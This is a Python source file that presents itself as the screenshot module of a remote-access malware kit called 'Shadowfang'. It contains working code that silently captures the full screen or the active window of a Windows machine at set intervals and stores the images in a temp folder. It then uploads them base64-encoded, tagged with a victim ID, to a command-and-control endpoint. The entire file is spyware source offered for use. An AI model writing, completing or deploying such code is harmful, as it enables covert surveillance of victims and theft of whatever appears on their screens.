#!/usr/bin/env python3
"""
SHADOWFANG MODULES - SCREENSHOT.PY
Screen capture and monitoring module
Captures screenshots, active windows, full screen, uploads to C2
"""

import os
import sys
import time
import json
import base64
import ctypes
import threading
import subprocess
from ctypes import wintypes
from datetime import datetime
from core import CoreUtils, WinAPI, Constants, logger

# ==================== SCREENSHOT CONSTANTS ====================

class ScreenshotConstants:
    """Screenshot configuration"""
    
    # Capture settings
    CAPTURE_INTERVAL = 60  # Seconds between captures
    SCREENSHOT_QUALITY = 85  # JPEG quality
    MAX_IMAGE_SIZE = 5 * 1024 * 1024  # 5MB max per screenshot
    
    # Output
    OUTPUT_DIR = os.path.join(
        os.environ.get('TEMP', 'C:\\Windows\\Temp'),
        'screenshots'
    )
    
    # C2
    UPLOAD_ENDPOINT = "/api/v1/screenshot"
    UPLOAD_INTERVAL = 300  # Upload every 5 minutes
    
    # Image formats
    FORMAT_PNG = 'PNG'
    FORMAT_JPEG = 'JPEG'
    FORMAT_BMP = 'BMP'

# ==================== WINDOWS SCREEN CAPTURE ====================

class WindowsScreenCapture:
    """Windows screen capture using GDI"""
    
    def __init__(self):
        self.user32 = ctypes.windll.user32
        self.gdi32 = ctypes.windll.gdi32
        self.screen_width = None
        self.screen_height = None
        self._get_screen_dimensions()
    
    def _get_screen_dimensions(self):
        """Get screen dimensions"""
        try:
            self.screen_width = self.user32.GetSystemMetrics(0)  # SM_CXSCREEN
            self.screen_height = self.user32.GetSystemMetrics(1)  # SM_CYSCREEN
        except:
            self.screen_width = 1920
            self.screen_height = 1080
    
    def capture_full_screen(self):
        """Capture full screen using GDI"""
        try:
            # Get screen DC
            screen_dc = self.user32.GetDC(None)
            
            if not screen_dc:
                return None
            
            # Create compatible DC
            memory_dc = self.gdi32.CreateCompatibleDC(screen_dc)
            
            # Create bitmap
            bitmap = self.gdi32.CreateCompatibleBitmap(
                screen_dc,
                self.screen_width,
                self.screen_height
            )
            
            # Select bitmap into memory DC
            old_bitmap = self.gdi32.SelectObject(memory_dc, bitmap)
            
            # BitBlt from screen to memory
            self.gdi32.BitBlt(
                memory_dc,
                0, 0,
                self.screen_width,
                self.screen_height,
                screen_dc,
                0, 0,
                0x00CC0020  # SRCCOPY
            )
            
            # Get bitmap data
            bmp_data = self._bitmap_to_bytes(bitmap, memory_dc)
            
            # Cleanup
            self.gdi32.SelectObject(memory_dc, old_bitmap)
            self.gdi32.DeleteObject(bitmap)
            self.gdi32.DeleteDC(memory_dc)
            self.user32.ReleaseDC(None, screen_dc)
            
            return bmp_data
            
        except Exception as e:
            logger.error(f"GDI capture failed: {e}")
            return None
    
    def _bitmap_to_bytes(self, bitmap, memory_dc):
        """Convert bitmap to bytes"""
        try:
            # BITMAPINFOHEADER
            class BITMAPINFOHEADER(ctypes.Structure):
                _fields_ = [
                    ('biSize', wintypes.DWORD),
                    ('biWidth', ctypes.c_long),
                    ('biHeight', ctypes.c_long),
                    ('biPlanes', wintypes.WORD),
                    ('biBitCount', wintypes.WORD),
                    ('biCompression', wintypes.DWORD),
                    ('biSizeImage', wintypes.DWORD),
                    ('biXPelsPerMeter', ctypes.c_long),
                    ('biYPelsPerMeter', ctypes.c_long),
                    ('biClrUsed', wintypes.DWORD),
                    ('biClrImportant', wintypes.DWORD)
                ]
            
            bmi = BITMAPINFOHEADER()
            bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
            bmi.biWidth = self.screen_width
            bmi.biHeight = -self.screen_height  # Top-down
            bmi.biPlanes = 1
            bmi.biBitCount = 32
            bmi.biCompression = 0
            
            # Allocate buffer
            buffer_size = self.screen_width * self.screen_height * 4
            buffer = ctypes.create_string_buffer(buffer_size)
            
            # Get bitmap data
            self.gdi32.GetDIBits(
                memory_dc,
                bitmap,
                0,
                self.screen_height,
                buffer,
                ctypes.byref(bmi),
                0
            )
            
            return buffer.raw
            
        except:
            return None
    
    def capture_window(self, hwnd=None):
        """Capture specific window"""
        try:
            if not hwnd:
                hwnd = self.user32.GetForegroundWindow()
            
            if not hwnd:
                return None
            
            # Get window rect
            rect = wintypes.RECT()
            self.user32.GetWindowRect(hwnd, ctypes.byref(rect))
            
            width = rect.right - rect.left
            height = rect.bottom - rect.top
            
            # Get window DC
            window_dc = self.user32.GetWindowDC(hwnd)
            
            if not window_dc:
                return None
            
            memory_dc = self.gdi32.CreateCompatibleDC(window_dc)
            bitmap = self.gdi32.CreateCompatibleBitmap(window_dc, width, height)
            old_bitmap = self.gdi32.SelectObject(memory_dc, bitmap)
            
            self.gdi32.BitBlt(
                memory_dc, 0, 0, width, height,
                window_dc, 0, 0, 0x00CC0020
            )
            
            bmp_data = self._bitmap_to_bytes(bitmap, memory_dc)
            
            # Cleanup
            self.gdi32.SelectObject(memory_dc, old_bitmap)
            self.gdi32.DeleteObject(bitmap)
            self.gdi32.DeleteDC(memory_dc)
            self.user32.ReleaseDC(hwnd, window_dc)
            
            return bmp_data
            
        except:
            return None

# ==================== PIL SCREEN CAPTURE ====================

class PILScreenCapture:
    """Screen capture using PIL/Pillow"""
    
    def __init__(self):
        self.pil_available = False
        self.screen_width = None
        self.screen_height = None
        
        try:
            from PIL import ImageGrab, Image
            self.ImageGrab = ImageGrab
            self.Image = Image
            self.pil_available = True
            
            # Get screen size
            screen = ImageGrab.grab()
            self.screen_width, self.screen_height = screen.size
            screen.close()
            
        except ImportError:
            logger.warning("PIL not available")
            self.pil_available = False
    
    def capture_full_screen(self):
        """Capture full screen using PIL"""
        if not self.pil_available:
            return None
        
        try:
            screenshot = self.ImageGrab.grab()
            
            if screenshot:
                # Convert to bytes
                import io
                buffer = io.BytesIO()
                screenshot.save(buffer, format='PNG')
                screenshot.close()
                return buffer.getvalue()
            
            return None
            
        except Exception as e:
            logger.error(f"PIL capture failed: {e}")
            return None
    
    def capture_region(self, bbox):
        """Capture specific region"""
        if not self.pil_available:
            return None
        
        try:
            screenshot = self.ImageGrab.grab(bbox=bbox)
            
            if screenshot:
                import io
                buffer = io.BytesIO()
                screenshot.save(buffer, format='PNG')
                screenshot.close()
                return buffer.getvalue()
            
            return None
            
        except:
            return None
    
    def capture_active_window(self):
        """Capture active window using PIL"""
        try:
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            
            if not hwnd:
                return None
            
            rect = wintypes.RECT()
            ctypes.windll.user32.GetWindowRect(hwnd, ctypes.byref(rect))
            
            bbox = (rect.left, rect.top, rect.right, rect.bottom)
            return self.capture_region(bbox)
            
        except:
            return None

# ==================== SCREENSHOT COMPRESSOR ====================

class ScreenshotCompressor:
    """Compress and optimize screenshots"""
    
    def __init__(self):
        self.compression_level = 6
    
    def compress_image(self, image_data, quality=85):
        """Compress image data"""
        try:
            from PIL import Image
            import io
            
            # Open image from bytes
            image = Image.open(io.BytesIO(image_data))
            
            # Convert to RGB if needed
            if image.mode != 'RGB':
                image = image.convert('RGB')
            
            # Save as JPEG with compression
            buffer = io.BytesIO()
            image.save(buffer, format='JPEG', quality=quality, optimize=True)
            image.close()
            
            compressed_data = buffer.getvalue()
            
            return compressed_data
            
        except:
            return image_data
    
    def resize_image(self, image_data, max_width=1920, max_height=1080):
        """Resize image if too large"""
        try:
            from PIL import Image
            import io
            
            image = Image.open(io.BytesIO(image_data))
            
            # Check if resize needed
            if image.width > max_width or image.height > max_height:
                ratio = min(max_width / image.width, max_height / image.height)
                new_width = int(image.width * ratio)
                new_height = int(image.height * ratio)
                
                image = image.resize((new_width, new_height), Image.LANCZOS)
            
            buffer = io.BytesIO()
            image.save(buffer, format='PNG')
            image.close()
            
            return buffer.getvalue()
            
        except:
            return image_data

# ==================== SCREENSHOT MONITOR ====================

class ScreenshotMonitor:
    """Continuous screenshot monitoring"""
    
    def __init__(self):
        self.windows_capture = WindowsScreenCapture()
        self.pil_capture = PILScreenCapture()
        self.compressor = ScreenshotCompressor()
        self.captured_shots = []
        self.monitoring = False
        self.monitor_thread = None
        self.stop_monitoring_flag = False
        self.capture_count = 0
    
    def start_monitoring(self, interval=60):
        """Start continuous screenshot monitoring"""
        if self.monitor_thread and self.monitor_thread.is_alive():
            return True
        
        self.monitoring = True
        self.stop_monitoring_flag = False
        
        def monitor_worker():
            while not self.stop_monitoring_flag:
                try:
                    # Capture screenshot
                    screenshot_data = self.capture_screenshot()
                    
                    if screenshot_data:
                        self.captured_shots.append({
                            'data': screenshot_data,
                            'timestamp': datetime.now().isoformat(),
                            'size': len(screenshot_data)
                        })
                        
                        self.capture_count += 1
                        
                        # Trim history
                        if len(self.captured_shots) > 100:
                            self.captured_shots = self.captured_shots[-100:]
                        
                        logger.info(f"Screenshot captured ({len(screenshot_data)} bytes)")
                    
                    time.sleep(interval)
                    
                except:
                    time.sleep(interval)
        
        self.monitor_thread = threading.Thread(target=monitor_worker)
        self.monitor_thread.daemon = True
        self.monitor_thread.start()
        
        logger.info(f"Screenshot monitoring started (interval: {interval}s)")
        return True
    
    def capture_screenshot(self, capture_window=False):
        """Capture single screenshot"""
        try:
            # Try PIL first
            if self.pil_capture.pil_available:
                if capture_window:
                    screenshot_data = self.pil_capture.capture_active_window()
                else:
                    screenshot_data = self.pil_capture.capture_full_screen()
                
                # Compress if using JPEG
                if screenshot_data and len(screenshot_data) > ScreenshotConstants.MAX_IMAGE_SIZE:
                    screenshot_data = self.compressor.compress_image(screenshot_data)
            else:
                # Fallback to GDI
                if capture_window:
                    screenshot_data = self.windows_capture.capture_window()
                else:
                    screenshot_data = self.windows_capture.capture_full_screen()
            
            return screenshot_data
            
        except:
            return None
    
    def stop_monitoring(self):
        """Stop monitoring"""
        self.stop_monitoring_flag = True
        self.monitoring = False
        
        if self.monitor_thread:
            self.monitor_thread.join(timeout=2)
        
        return True
    
    def get_shots(self):
        """Get captured screenshots"""
        return self.captured_shots
    
    def clear_shots(self):
        """Clear captured screenshots"""
        self.captured_shots.clear()
        self.capture_count = 0
        return True

# ==================== SCREENSHOT SAVER ====================

class ScreenshotSaver:
    """Save screenshots to disk"""
    
    def __init__(self):
        self.output_dir = ScreenshotConstants.OUTPUT_DIR
    
    def save_screenshot(self, image_data, filename=None, format='PNG'):
        """Save screenshot to file"""
        try:
            if not filename:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"screenshot_{timestamp}.{format.lower()}"
            
            filepath = os.path.join(self.output_dir, filename)
            
            os.makedirs(self.output_dir, exist_ok=True)
            
            with open(filepath, 'wb') as f:
                f.write(image_data)
            
            logger.info(f"Screenshot saved: {filepath}")
            return filepath
            
        except Exception as e:
            logger.error(f"Screenshot save failed: {e}")
            return None
    
    def save_base64(self, base64_data, filename=None):
        """Save base64 encoded screenshot"""
        try:
            image_data = base64.b64decode(base64_data)
            return self.save_screenshot(image_data, filename)
        except:
            return None
    
    def save_all(self, screenshots, prefix='batch'):
        """Save multiple screenshots"""
        saved_files = []
        
        for i, shot in enumerate(screenshots):
            filename = f"{prefix}_{i}_{datetime.now().strftime('%H%M%S')}.png"
            filepath = self.save_screenshot(shot['data'], filename)
            
            if filepath:
                saved_files.append(filepath)
        
        return saved_files

# ==================== SCREENSHOT UPLOADER ====================

class ScreenshotUploader:
    """Upload screenshots to C2"""
    
    def __init__(self, communicator=None):
        self.communicator = communicator
        self.uploaded_shots = []
        self.pending_uploads = []
    
    def upload_screenshot(self, image_data, victim_id=None):
        """Upload screenshot to C2"""
        try:
            # Check size
            if len(image_data) > ScreenshotConstants.MAX_IMAGE_SIZE:
                logger.warning("Screenshot too large for upload")
                return False
            
            # Encode
            encoded_data = base64.b64encode(image_data).decode()
            
            payload = {
                'type': 'screenshot',
                'data': encoded_data,
                'size': len(image_data),
                'victim_id': victim_id,
                'timestamp': datetime.now().isoformat()
            }
            
            if self.communicator:
                response = self.communicator.send_post(
                    ScreenshotConstants.UPLOAD_ENDPOINT,
                    payload
                )
                
                if response:
                    self.uploaded_shots.append({
                        'timestamp': datetime.now().isoformat(),
                        'size': len(image_data)
                    })
                    return True
            
            # Queue for later
            self.pending_uploads.append({
                'data': encoded_data,
                'timestamp': datetime.now().isoformat()
            })
            
            return False
            
        except:
            return False
    
    def upload_pending(self):
        """Upload all pending screenshots"""
        if not self.communicator:
            return 0
        
        uploaded = 0
        
        for item in self.pending_uploads[:]:
            payload = {
                'type': 'screenshot',
                'data': item['data'],
                'timestamp': item['timestamp']
            }
            
            response = self.communicator.send_post(
                ScreenshotConstants.UPLOAD_ENDPOINT,
                payload
            )
            
            if response:
                self.pending_uploads.remove(item)
                uploaded += 1
        
        return uploaded

# ==================== MAIN SCREENSHOT MANAGER ====================

class ScreenshotManager:
    """Main screenshot orchestration"""
    
    def __init__(self):
        self.monitor = ScreenshotMonitor()
        self.saver = ScreenshotSaver()
        self.uploader = ScreenshotUploader()
        self.active = False
    
    def start_monitoring(self, interval=60):
        """Start screenshot monitoring"""
        logger.info("Starting screenshot monitoring...")
        
        self.monitor.start_monitoring(interval)
        
        self.active = True
        return True
    
    def capture_now(self, capture_window=False):
        """Capture screenshot immediately"""
        return self.monitor.capture_screenshot(capture_window)
    
    def capture_and_save(self, capture_window=False):
        """Capture and save screenshot"""
        screenshot_data = self.capture_now(capture_window)
        
        if screenshot_data:
            return self.saver.save_screenshot(screenshot_data)
        
        return None
    
    def capture_and_upload(self, victim_id=None, capture_window=False):
        """Capture and upload screenshot"""
        screenshot_data = self.capture_now(capture_window)
        
        if screenshot_data:
            return self.uploader.upload_screenshot(screenshot_data, victim_id)
        
        return False
    
    def stop_monitoring(self):
        """Stop monitoring"""
        self.monitor.stop_monitoring()
        self.active = False
        return True
    
    def save_all(self):
        """Save all captured screenshots"""
        return self.saver.save_all(self.monitor.get_shots())
    
    def get_status(self):
        """Get screenshot manager status"""
        return {
            'active': self.active,
            'monitoring': self.monitor.monitoring,
            'captured_count': self.monitor.capture_count,
            'uploaded_count': len(self.uploader.uploaded_shots),
            'pending_uploads': len(self.uploader.pending_uploads)
        }
    
    def cleanup(self, max_age_hours=24):
        """Clean up old screenshots"""
        try:
            cutoff_time = time.time() - (max_age_hours * 3600)
            
            if os.path.exists(self.saver.output_dir):
                for file in os.listdir(self.saver.output_dir):
                    filepath = os.path.join(self.saver.output_dir, file)
                    
                    if os.path.getmtime(filepath) < cutoff_time:
                        os.remove(filepath)
            
            return True
        except:
            return False

# ==================== SINGLETON INSTANCE ====================

screenshot_manager = ScreenshotManager()

# ==================== EXPORT ====================

__all__ = [
    'WindowsScreenCapture',
    'PILScreenCapture',
    'ScreenshotCompressor',
    'ScreenshotMonitor',
    'ScreenshotSaver',
    'ScreenshotUploader',
    'ScreenshotManager',
    'screenshot_manager'
]